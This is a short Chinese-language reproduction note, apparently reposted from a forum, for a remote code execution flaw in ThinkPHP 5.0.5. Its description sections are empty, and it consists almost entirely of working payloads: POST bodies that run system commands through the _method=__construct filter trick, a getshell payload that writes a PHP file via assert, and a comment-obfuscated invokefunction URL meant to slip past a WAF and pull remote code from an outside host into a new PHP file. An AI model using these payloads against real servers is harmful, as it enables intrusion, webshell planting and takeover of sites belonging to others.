# Thinkphp 5.0.5

> 原文：[https://www.zhihuifly.com/t/topic/3148](https://www.zhihuifly.com/t/topic/3148)

# Thinkphp 5.0.5

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

> www.0-sec.org/?s=index/index

```
POST

s=whoami&_method=__construct&method=POST&filter[]=system

aaaa=whoami&_method=__construct&method=GET&filter[]=system `_method=__construct&method=GET&filter[]=system&get[]=whoami` 
```

> getshell

```
POST `s=file_put_contents(‘zerosec.php’,’<?php phpinfo();’)&_method=__construct&method=POST&filter[]=assert` 
```

### 补充

waf对eval进行了拦截

禁止了assert函数对eval函数后面的括号进行了正则过滤

对file_get_contents函数后面的括号进行了正则过滤

```
http://www.0-sec.org/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=2.php&vars[1][1]=<?php /*1111*//***/file_put_contents/*1**/(/***/'index11.php'/**/,file_get_contents(/**/'https://www.hack.com/xxx.js'))/**/;/**/?> 
```